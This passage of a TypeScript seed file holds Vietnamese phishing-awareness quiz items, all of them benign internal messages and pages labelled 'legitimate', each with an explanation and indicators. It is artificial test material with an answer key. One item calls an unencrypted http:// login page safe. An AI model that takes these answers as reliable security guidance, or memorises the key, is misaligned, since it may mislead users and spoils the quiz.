    title: "SMS nhắc lịch khai giảng khóa đào tạo",
    category: "SMS",
    scenarioIntro: "Bạn đã ghi danh một khóa đào tạo nội bộ tuần trước.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `
      <div class="phone-sim">
        <div class="phone-frame">
          <div class="phone-status"><span>16:40</span><span>4G 78%</span></div>
          <div class="phone-header">
            <div class="phone-avatar">v</div>
            <div><strong>vpsLearn</strong><span>SMS</span></div>
          </div>
          <div class="message-thread">
            <div class="message-bubble inbound">
              <p data-spot="safe" data-label="Nội dung khớp khóa học bạn đã ghi danh trên hệ thống đào tạo nội bộ">vpsLearn: Khoa An toan thong tin co ban khai giang 09:00 ngay 02/12 tai Hoi truong A.</p>
              <p data-spot="safe" data-label="Không có liên kết, không yêu cầu bấm hay đăng nhập">Vui long co mat truoc 10 phut. Khong can xac nhan lai qua tin nhan.</p>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Tin nhắn chỉ nhắc thời gian và địa điểm lớp học, không có liên kết cần bấm cũng không đòi thông tin cá nhân.",
    indicators: [
      "Nội dung khớp khóa học đã đăng ký",
      "Không có liên kết",
      "Không yêu cầu thông tin cá nhân",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 73,
  },
  {
    id: "safe-sms-hrm-payslip",
    title: "SMS thông báo phiếu lương đã phát hành",
    category: "SMS",
    scenarioIntro: "Đến kỳ trả lương hằng tháng của công ty.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `
      <div class="phone-sim">
        <div class="phone-frame">
          <div class="phone-status"><span>08:05</span><span>4G 78%</span></div>
          <div class="phone-header">
            <div class="phone-avatar">V</div>
            <div><strong>VPS HRM</strong><span>SMS</span></div>
          </div>
          <div class="message-thread">
            <div class="message-bubble inbound">
              <p data-spot="safe" data-label="Thông báo đúng chu kỳ trả lương hằng tháng">VPS HRM: Phieu luong thang 11 da phat hanh tren cong nhan su noi bo.</p>
              <p data-spot="safe" data-label="Hướng dẫn tự đăng nhập thay vì bấm liên kết trong tin nhắn">Vui long tu dang nhap cong noi bo de xem. VPS khong gui phieu luong qua tin nhan.</p>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Tin nhắn hướng dẫn bạn tự đăng nhập cổng nhân sự nội bộ thay vì bấm liên kết, và khẳng định không gửi phiếu lương qua SMS - đây là cách làm an toàn.",
    indicators: [
      "Không đính kèm liên kết để bấm",
      "Hướng dẫn tự truy cập cổng nội bộ",
      "Khớp chu kỳ trả lương hằng tháng",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 74,
  },
  {
    id: "safe-sms-shuttle-change",
    title: "SMS đổi giờ xe đưa đón",
    category: "SMS",
    scenarioIntro: "Hành chính thông báo thay đổi giờ xe đưa đón do thời tiết.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `
      <div class="phone-sim">
        <div class="phone-frame">
          <div class="phone-status"><span>16:55</span><span>4G 78%</span></div>
          <div class="phone-header">
            <div class="phone-avatar">V</div>
            <div><strong>VPS HC</strong><span>SMS</span></div>
          </div>
          <div class="message-thread">
            <div class="message-bubble inbound">
              <p data-spot="safe" data-label="Chỉ thông báo thay đổi lịch, không yêu cầu thao tác nào">VPS HC: Do mua lon, xe dua don chieu nay xuat phat luc 17:45 thay vi 17:30.</p>
              <p data-spot="safe" data-label="Không có liên kết và không hỏi thông tin cá nhân">Chi tiet xem tren bang tin noi bo. Cam on anh chi.</p>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Tin nhắn chỉ thông báo thay đổi giờ xe, không có liên kết, không yêu cầu cung cấp thông tin hay thanh toán.",
    indicators: [
      "Chỉ thông báo thay đổi lịch",
      "Không có liên kết",
      "Không yêu cầu thông tin",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 75,
  },
  {
    id: "safe-web-hrm-login",
    title: "Trang đăng nhập cổng nhân sự",
    category: "Website",
    scenarioIntro: "Bạn mở cổng nhân sự để cập nhật thông tin cá nhân.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="safe" data-label="Đúng tên miền cổng nhân sự nội bộ hrm.vps.com.vn"><span>http://hrm.vps.com.vn/login</span></div>
          </div>
          <div class="browser-page">
            <h4>Cổng nhân sự VPS</h4>
            <p data-spot="safe" data-label="Đăng nhập bằng SSO công ty, không có ô nhập mật khẩu email rời rạc">Đăng nhập bằng tài khoản nội bộ (SSO).</p>
            <button type="button">Đăng nhập bằng tài khoản công ty</button>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Địa chỉ đúng cổng nhân sự nội bộ hrm.vps.com.vn và đăng nhập qua SSO của công ty chứ không phải biểu mẫu nhập mật khẩu lạ.",
    indicators: [
      "Tên miền hrm.vps.com.vn chính xác",
      "Đăng nhập qua SSO công ty",
      "Không yêu cầu nhập lại mật khẩu email",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 76,
  },
  {
    id: "safe-web-confluence-doc",
    title: "Trang tài liệu quy trình trên Confluence",
    category: "Website",
    scenarioIntro: "Bạn mở tài liệu quy trình bàn giao thiết bị.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="safe" data-label="Đúng kho tài liệu nội bộ confluence.vps.com.vn"><span>https://confluence.vps.com.vn/it/quy-trinh-ban-giao-thiet-bi</span></div>
          </div>
          <div class="browser-page">
            <h4>Quy trình bàn giao thiết bị</h4>
            <p data-spot="safe" data-label="Trang chỉ hiển thị nội dung tài liệu, không có biểu mẫu thu thập thông tin">Phiên bản 2.1 - cập nhật 12/11 bởi Phòng IT.</p>
            <p>1. Nhận thiết bị tại kho IT tầng 3.<br/>2. Ký biên bản bàn giao.<br/>3. Cài đặt theo hướng dẫn nội bộ.</p>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Trang thuộc kho tài liệu nội bộ confluence.vps.com.vn, chỉ hiển thị nội dung quy trình và không có biểu mẫu thu thập thông tin.",
    indicators: [
      "Tên miền confluence.vps.com.vn",
      "Chỉ hiển thị tài liệu",
      "Không có ô nhập dữ liệu",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 77,
  },
  {
    id: "safe-web-esm-portal",
    title: "Cổng tạo yêu cầu hỗ trợ ESM",
    category: "Website",
    scenarioIntro: "Máy in tầng 5 gặp lỗi nên bạn vào cổng hỗ trợ để tạo yêu cầu.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="safe" data-label="Đúng cổng hỗ trợ người dùng esm.vps.com.vn"><span>https://esm.vps.com.vn/ho-tro/tao-yeu-cau</span></div>
          </div>
          <div class="browser-page">
            <h4>Tạo yêu cầu hỗ trợ</h4>
            <p data-spot="safe" data-label="Biểu mẫu chỉ hỏi thông tin về sự cố, không hỏi mật khẩu hay dữ liệu cá nhân">Loại yêu cầu: Thiết bị văn phòng</p>
            <p>Mô tả sự cố: máy in tầng 5 báo lỗi kẹt giấy.</p>
            <button type="button">Gửi yêu cầu</button>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Trang thuộc cổng hỗ trợ người dùng esm.vps.com.vn và chỉ hỏi thông tin mô tả sự cố, không hỏi mật khẩu hay dữ liệu cá nhân nhạy cảm.",
    indicators: [
      "Tên miền esm.vps.com.vn",
      "Chỉ hỏi thông tin về sự cố",
      "Không thu thập thông tin nhạy cảm",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 78,
  },
  {
    id: "safe-invoice-internal",
    title: "Hóa đơn dịch vụ đã đối chiếu với hợp đồng",
    category: "Invoice",
    scenarioIntro: "Kế toán chuyển tiếp hóa đơn dịch vụ định kỳ để bạn xác nhận nghiệm thu.",
    scenarioContent: "Kiểm tra hóa đơn bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row"><strong>From:</strong> Phòng Kế toán &lt;ketoan@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Hóa đơn dịch vụ vệ sinh tháng 11 - HĐ số 2024/VS-11</div>
        <p>Hóa đơn khớp hợp đồng khung số 2024/VS đã ký, thanh toán theo tài khoản ghi trong hợp đồng.</p>
        <p data-spot="safe" data-label="Không đổi số tài khoản, không hối thúc - thanh toán theo hợp đồng đã ký">Không có thay đổi về tài khoản thụ hưởng.</p>
        <p data-spot="safe" data-label="Chứng từ được tra cứu trên hệ thống nội bộ, không phải tệp lạ đính kèm">Chứng từ gốc lưu tại <a href="https://confluence.vps.com.vn/ke-toan/hd-2024-vs" title="https://confluence.vps.com.vn/ke-toan/hd-2024-vs">confluence.vps.com.vn/ke-toan/hd-2024-vs</a></p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Hóa đơn đến từ kế toán nội bộ, khớp hợp đồng khung đã ký, không thay đổi tài khoản thụ hưởng và chứng từ được tra cứu trên hệ thống nội bộ.",
    indicators: [
      "Người gửi nội bộ vps.com.vn",
      "Khớp hợp đồng đã ký, không đổi tài khoản nhận tiền",
      "Không hối thúc thanh toán gấp",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 79,
  },
  {
    id: "safe-alert-new-login",
    title: "Cảnh báo đăng nhập từ thiết bị bạn vừa dùng",
    category: "Account Alert",
    scenarioIntro: "Bạn vừa đăng nhập máy tính công ty và nhận được email cảnh báo.",
    scenarioContent: "Kiểm tra cảnh báo tài khoản bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row"><strong>From:</strong> VPS Security &lt;security@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Đăng nhập mới trên thiết bị VPS-LT-2291</div>
        <p>Thời gian: 08:42 hôm nay - Văn phòng Hà Nội - Thiết bị do công ty cấp.</p>
        <p data-spot="safe" data-label="Chỉ thông báo, hướng dẫn tự báo ESM nếu bất thường thay vì bấm liên kết lạ">Nếu không phải bạn, hãy tạo yêu cầu trên cổng ESM nội bộ.</p>
        <p data-spot="safe" data-label="Không có liên kết đăng nhập hay yêu cầu xác minh mật khẩu">Email này không yêu cầu bạn đăng nhập hay xác minh mật khẩu.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Cảnh báo khớp đúng lần đăng nhập bạn vừa thực hiện, không kèm liên kết đăng nhập và hướng dẫn báo qua cổng ESM nội bộ nếu bất thường.",
    indicators: [
      "Khớp với hành động bạn vừa thực hiện",
      "Không có liên kết yêu cầu đăng nhập",
      "Hướng dẫn báo qua kênh nội bộ chính thức",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 80,
  },
  {
    id: "safe-alert-password-expiry",
    title: "Nhắc đổi mật khẩu định kỳ",
    category: "Account Alert",
    scenarioIntro: "Chính sách công ty yêu cầu đổi mật khẩu mỗi 90 ngày.",
    scenarioContent: "Kiểm tra cảnh báo tài khoản bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row"><strong>From:</strong> VPS IT &lt;it-notice@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Mật khẩu của bạn sẽ hết hạn sau 7 ngày</div>
        <p>Vui lòng đổi mật khẩu trực tiếp trên máy tính công ty bằng tổ hợp Ctrl + Alt + Delete.</p>
        <p data-spot="safe" data-label="Hướng dẫn đổi mật khẩu ngay trên máy, không qua liên kết nào">Email không kèm liên kết đổi mật khẩu.</p>
        <p data-spot="safe" data-label="Có kênh kiểm chứng nội bộ nếu người nhận nghi ngờ">Thắc mắc vui lòng tạo yêu cầu trên cổng ESM nội bộ.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Thông báo đúng chính sách 90 ngày, hướng dẫn đổi mật khẩu ngay trên máy tính công ty và hoàn toàn không kèm liên kết - cách làm an toàn của bộ phận IT.",
    indicators: [
      "Không kèm liên kết đổi mật khẩu",
      "Hướng dẫn thao tác trực tiếp trên máy",
      "Có kênh kiểm chứng nội bộ",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 81,
  },
];

export const seedQuestions: QuizQuestion[] = baseSeedQuestions.map((question, index) => ({
  ...question,
  timeLimitSeconds: seedTimeLimits[index % seedTimeLimits.length],
}));
